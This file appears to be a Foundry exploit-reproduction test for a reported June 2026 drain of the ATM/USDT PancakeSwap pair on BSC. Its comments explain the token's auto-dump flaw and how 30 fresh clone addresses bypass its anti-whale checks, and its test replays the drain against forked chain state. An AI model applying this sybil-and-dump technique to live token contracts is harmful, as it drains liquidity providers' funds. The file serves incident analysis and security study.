// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$243,543 USDT (gross drained from the ATM/USDT PancakeSwap pair)
// Attacker EOA    : 0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE
// Attacker Helper : 0xeCe23b485c38110b7a50B5067B7D4B644f897Dc9 (drives the 30 farmer clones)
// Vulnerable      : 0x986058ec93756E57b4e55b406dD0BeE24bcD95e3 (ATM token, custom _transfer)
// Victim pair     : 0x659b44d603052132fd36cf048d9e0ba1e307ae3a (ATM/USDT Cake-LP)
// Setup    Tx     : 0x3738909da7960d72efc2635d73aff5f15ef14a1b18ee0281abaa3d4c94adc69b (block 102070707, buy leg)
// Drain    Tx     : 0x37b90a337075cd2feea93b12780abe9f953dad476e1c1418a02447aaa6dcfd86 (block 102072357, sell leg)
// @Analysis
// Attack date : June 4, 2026
// Chain       : BSC, drain Block 102072357
// SlowMist    : https://hacked.slowmist.io/  (ATM, BSC, $243,500)
//
// ---------------------------------------------------------------------------------------------
// Root cause (verified from Sourcify-verified ATMToken source):
//
// ATMToken._transfer() sell branch (recipient == uniswapV2Pair, not add-liquidity) auto-dumps the
// contract's OWN ATM holdings whenever its balance exceeds swapAtAmount (200e18):
//
//     uint256 contractTokenBalance = balanceOf[address(this)];
//     if (contractTokenBalance > swapAtAmount) {
//         uint256 numTokensSellToFund = (amount * numTokensSellRate) / 100; // numTokensSellRate = 20 -> 20%
//         if (numTokensSellToFund > contractTokenBalance) numTokensSellToFund = contractTokenBalance;
//         _swapTokenForFund(numTokensSellToFund);  // PancakeSwap sell with amountOutMin = 0
//     }
//
// On every sell the token sells an extra 20%-of-the-sell-size of its own reserves into the pair
// at amountOutMin=0, with proceeds going to the marketing/dividend wallets. Combined with weak
// anti-whale controls that key only off the *sender's* fresh state, an attacker farms the pool.
//
// The anti-whale / anti-bot guards in _transfer are all per-(sender) and per-(recipient) and are
// trivially side-stepped by spreading the position across many brand-new addresses:
//   * MAX_HOLDER (100_000e18)  -> only checked on the RECIPIENT; each farmer holds < 100k.
//   * coldTime  (lastBuyTime)  -> a fresh address has lastBuyTime == 0, so the 1-min sell lock
//                                 (`block.timestamp >= lastBuyTime[sender] + coldTime`) is always satisfied.
//   * tOwnedU 25% profit fee   -> a fresh address has tOwnedU == 0 (the `else` cost-basis branch).
//
// ---------------------------------------------------------------------------------------------
// Full on-chain attack (three phases, reconstructed from chain state):
//
//  1. SETUP  (tx 0x3738..69b, block 102070707): the helper buys ~2.85M ATM for ~154,319 USDT and
//     spreads it across 30 fresh CREATE2 "farmer" clones (~94,999 ATM each, < MAX_HOLDER), each of
//     which pre-approves the helper. ATM price after this leg ~0.053 USDT.
//
//  2. PUMP   (132 attacker txs, nonce 2308 -> 2440): a burn-on-buy ratchet removes ~45.7M ATM from
//     the pair (pair ATM reserve 92.0M -> 45.7M, DEAD balance +45.7M), ~doubling the price to
//     ~0.108 USDT/ATM. This is baked into chain state by the time of the drain block.
//
//  3. DRAIN  (tx 0x37b9..d86, block 102072357): the helper calls each of the 30 pre-funded clones to
//     dump its ATM into the now-pumped pair. Each sell ALSO fires _swapTokenForFund (the contract
//     dumps its own ATM to the fee wallets). Net result: 30 swaps extract 243,543 USDT to the helper.
//
// Economics: gross extracted in the drain tx = $243,543 (the figure SlowMist reports). Net of the
// ~$154,319 spent buying in the setup leg, the attacker's profit is ~$89,224 USDT; the pool/LPs are
// the net losers. The ~$57,597 the contract auto-dumped to its fee wallets is a *separate* leak and
// does NOT accrue to the attacker (it actually slightly worsens the price the attacker sells into).
//
// This PoC reproduces phase 3 (the headline drain) on a fork at DRAIN_BLOCK-1, where the 30 farmer
// clones already hold their pumped ATM. The 132-tx pump campaign is not replayed tx-by-tx; it is
// taken as given chain state, exactly as it was at the moment of the real cash-out transaction.

interface IATM is IERC20 {
    function swapAtAmount() external view returns (uint256);
    function numTokensSellRate() external view returns (uint256);
    function presale() external view returns (bool);
    function marketingAddress() external view returns (address);
    function dividendAddress() external view returns (address);
}

contract ATMExploitTest is Test {
    IATM constant ATM = IATM(0x986058ec93756E57b4e55b406dD0BeE24bcD95e3);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant PAIR = 0x659b44D603052132Fd36cf048D9e0BA1e307AE3a;
    IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address constant ATTACKER = 0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE;

    uint256 constant DRAIN_BLOCK = 102_072_357;

    // The 30 pre-funded farmer clones (sell order of the real drain tx). Each was loaded with
    // ~94,999 ATM and pre-approved the attacker helper during the setup leg.
    address[30] FARMERS = [
        0xC15D8313E80FF3f1Ab7C4aA2Acd648b2077Eb52A,
        0x4e5B258Dc3BF21aa23760950d696E6A3C1f87300,
        0x7F5012a11e9794ac0acC7BD6cEF3F65a0aeC71FA,
        0x94f7420549d28C4f323E65929347eDB170e5D54a,
        0x55da04B75b7C8E905E672281c5414Ae10Dc1427F,
        0xbbE72Dc0B2f0557FB2bd90FBa1AE3C0aCC641409,
        0x82dD0626bB982bf67FE2AfAEF4E4eC3d6fBfA523,
        0xF3905e36032634FBb8c13aEF85Cadc179882E18D,
        0xB055AC5817bFdfB4C535E92015F84F1922220bA1,
        0x64976c1259EB3FE467c8d8b644f1D0183FeA7a03,
        0xb40c72Bba81030aeF1Bf67ae941091D8a96a7CCc,
        0xB2bc8BaE8d910Ea1a05C0d0276Bc3d281FD27FdC,
        0xac904A40A80d0f92C67cbC762b5f44267e59E435,
        0xbb4644EF051B826B0532497422BFa5aA39c05307,
        0x168B370C833694D286A08bD83a80f98aeDb9E278,
        0x34fa1C6181519163d23c3965f3Db57B24ed22d2f,
        0x9317164a26E75e631b2e3332bE6b085984Ce67B8,
        0x097f5FDbB3ae1161bCaD68C87414140a388AD311,
        0x8fbEef088b3A7322370c92c37De3BDFE14Ed5821,
        0x92027964d6FD6D557b43153cBC1A458F6310A3E8,
        0xDE55b4F9191D9bCc9266aD66A7Ecc95E716c0690,
        0x3F857Bb8e7EEffa360c0Dc6b0bA3429FEf6a919a,
        0xdEB53352Ee65263BEd0aD3819a221A2912555d42,
        0x933d0264f1E9189dfC7a5f0fD962070ee923a714,
        0xe3Ef365E3AffdB5421CcF538f299e047Db49b6C1,
        0xe45e60e33c9C07CcDEE453AbCE8e479acE513d1e,
        0x05B1Ff0725094405473E9309C6002813db1bF962,
        0x007E6dF4c9ab9Fe72e0d68F462cAf508640B6BFe,
        0x55dBA7ACa55062d928d850ce61FdB25662ce712F,
        0x15f7197203d5C0058f2b213cEaF16ACF3B4dABA3
    ];

    function setUp() public {
        vm.createSelectFork("bsc", DRAIN_BLOCK - 1);
        vm.label(address(ATM), "ATM");
        vm.label(address(USDT), "USDT");
        vm.label(PAIR, "ATM/USDT-Pair");
        vm.label(address(ROUTER), "PancakeRouter");
        vm.label(ATTACKER, "Attacker");
    }

    // ---------------------------------------------------------------------
    // Recon: confirm the pumped price, the pre-funded farmers, and that the
    // contract's self-balance exceeds swapAtAmount (so the auto-swap fires).
    // ---------------------------------------------------------------------
    function testRecon() public view {
        (uint112 rU, uint112 rATM,) = IPancakePair(PAIR).getReserves();
        console.log("ATM/USDT pair @drain-1:");
        console.log("  USDT reserve :", uint256(rU) / 1e18);
        console.log("  ATM  reserve :", uint256(rATM) / 1e18);
        console.log("  price (USDT/ATM, 1e6 scaled):", (uint256(rU) * 1e6) / uint256(rATM));
        console.log("presale            :", ATM.presale());
        console.log("swapAtAmount       :", ATM.swapAtAmount() / 1e18);
        console.log("numTokensSellRate  :", ATM.numTokensSellRate());
        console.log("ATM self-balance   :", ATM.balanceOf(address(ATM)) / 1e18, "(auto-swap fires when > swapAtAmount)");

        uint256 totalFarmed;
        for (uint256 i; i < FARMERS.length; ++i) {
            totalFarmed += ATM.balanceOf(FARMERS[i]);
        }
        console.log("farmer clones      :", FARMERS.length);
        console.log("total ATM in farmers:", totalFarmed / 1e18);
    }

    // ---------------------------------------------------------------------
    // Exploit: dump every pre-funded farmer's ATM into the pumped pair. Each
    // sell re-triggers ATMToken._swapTokenForFund() (the 20% contract auto-dump).
    // ---------------------------------------------------------------------
    function testExploit() public {
        uint256 marketingBefore = USDT.balanceOf(ATM.marketingAddress());
        uint256 dividendBefore = USDT.balanceOf(ATM.dividendAddress());
        uint256 usdtBefore = USDT.balanceOf(ATTACKER);

        console.log("Attacker USDT before:", usdtBefore / 1e18);

        address[] memory path = new address[](2);
        path[0] = address(ATM);
        path[1] = address(USDT);

        for (uint256 i; i < FARMERS.length; ++i) {
            address farmer = FARMERS[i];
            uint256 bal = ATM.balanceOf(farmer);
            if (bal == 0) continue;

            // Drive the pre-funded clone exactly as the helper did: sell its ATM into the pair,
            // routing the USDT to the attacker. The router's fee-on-transfer variant tolerates the
            // ATM tax + the contract's own auto-dump that fires inside _transfer.
            vm.startPrank(farmer);
            ATM.approve(address(ROUTER), bal);
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(bal, 0, path, ATTACKER, block.timestamp);
            vm.stopPrank();
        }

        uint256 usdtAfter = USDT.balanceOf(ATTACKER);
        uint256 profit = usdtAfter - usdtBefore;

        console.log("Attacker USDT after :", usdtAfter / 1e18);
        console.log("------------------------------------------------");
        console.log("Gross USDT drained to attacker :", profit / 1e18);
        console.log("Auto-swap leak -> marketing     :", (USDT.balanceOf(ATM.marketingAddress()) - marketingBefore) / 1e18);
        console.log("Auto-swap leak -> dividend       :", (USDT.balanceOf(ATM.dividendAddress()) - dividendBefore) / 1e18);

        // Reproduces the reported ~$243,543 gross drain (allow slop for swap ordering / dust).
        assertGt(profit, 230_000 ether, "drain below expected");
        assertLt(profit, 260_000 ether, "drain above expected");
    }
}
